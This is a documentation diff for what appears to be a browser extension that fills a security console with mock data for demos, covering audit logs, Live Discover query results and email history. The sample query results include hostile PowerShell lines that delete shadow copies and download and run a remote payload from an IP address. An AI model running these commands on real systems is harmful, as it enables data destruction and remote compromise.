@@ -320,6 +320,121 @@ Controls `/ews-query/v1/attacks` response.
 }
 ```
 
+### auditLogs
+Controls audit log pages (`/api/audit/logs`, `/api/logs/audit`).
+
+- `mode`: `"prepend"` (add to real logs) or `"override"` (replace entirely)
+- `items`: Array of audit log entries
+
+**Audit Log Entry Shape:**
+```json
+{
+  "id": "auto",
+  "timestamp": "-15m",
+  "type": "admin_action",
+  "category": "endpoint",
+  "action": "Device isolated from network",
+  "actor": "Sophos MDR Team",
+  "actorType": "admin",
+  "target": "DESKTOP-FIN042",
+  "targetType": "endpoint",
+  "result": "success",
+  "description": "MDR team isolated DESKTOP-FIN042 following ransomware detection. Network access revoked pending forensic analysis.",
+  "ipAddress": "10.0.0.1",
+  "data": {}
+}
+```
+
+### liveDiscover
+Controls Live Discover / XDR query pages.
+
+- `savedQueries`: Override for query catalog / saved queries list
+- `queryResults`: Override for query execution results
+- `connectedEndpoints`: Override for available endpoints to query
+
+**Query Results Shape:**
+```json
+{
+  "id": "auto",
+  "status": "completed",
+  "query": "SELECT pid, name, path, cmdline FROM processes WHERE name LIKE '%powershell%'",
+  "queryName": "Suspicious PowerShell Processes",
+  "startedAt": "-2m",
+  "completedAt": "-1m",
+  "endpointsQueried": 5,
+  "endpointsResponded": 5,
+  "totalResults": 3,
+  "columns": [
+    { "name": "pid", "type": "INTEGER" },
+    { "name": "name", "type": "TEXT" },
+    { "name": "path", "type": "TEXT" },
+    { "name": "cmdline", "type": "TEXT" },
+    { "name": "endpoint_hostname", "type": "TEXT" }
+  ],
+  "rows": [
+    [12028, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ExecutionPolicy Bypass -C \"vssadmin delete shadows\"", "DESKTOP-FIN042"],
+    [8844, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ep bypass -file C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\update.ps1", "DESKTOP-FIN042"],
+    [3392, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -w hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://45.33.49.12/beacon')\"", "DESKTOP-FIN042"]
+  ]
+}
+```
+
+**Saved Queries Shape:**
+```json
+{
+  "items": [
+    {
+      "id": "auto",
+      "name": "Suspicious PowerShell Processes",
+      "description": "Find PowerShell processes with suspicious command lines",
+      "category": "threat-hunting",
+      "query": "SELECT pid, name, path, cmdline FROM processes WHERE name LIKE '%powershell%'",
+      "createdBy": "Sophos",
+      "isBuiltIn": true
+    }
+  ],
+  "pages": { "current": 1, "size": 50, "total": 1, "items": 1 }
+}
+```
+
+### emailHistory
+Controls email message history and quarantine pages.
+
+- `messages`: Override for message search / history list
+- `quarantine`: Override for quarantined messages list
+- `messageDetail`: Override for individual message trace
+
+**Email Message Shape:**
+```json
+{
+  "items": [
+    {
+      "id": "auto",
+      "timestamp": "-8m",
+      "direction": "INBOUND",
+      "from": "attacker@secure-login-verify.com",
+      "to": "sarah.chen@{{customerDomain}}",
+      "subject": "Action Required: Verify Your Account",
+      "status": "BLOCKED",
+      "reason": "MALICIOUS_URL",
+      "size": 45678,
+      "attachments": 0,
+      "urls": ["https://secure-login-verify.com/portal/login.php"],
+      "scanResults": {
+        "spamScore": 95,
+        "phishingScore": 99,
+        "malwareDetected": false,
+        "urlRewrite": true,
+        "sandboxResult": "MALICIOUS"
+      }
+    }
+  ],
+  "total": 47,
+  "filtered": 47,
+  "pages": { "current": 1, "size": 20, "total": 3, "items": 47 }
+}
+```
+
 ## Timestamp Shortcuts
 
 Instead of ISO timestamps, use relative shorthand. The extension resolves them at runtime:
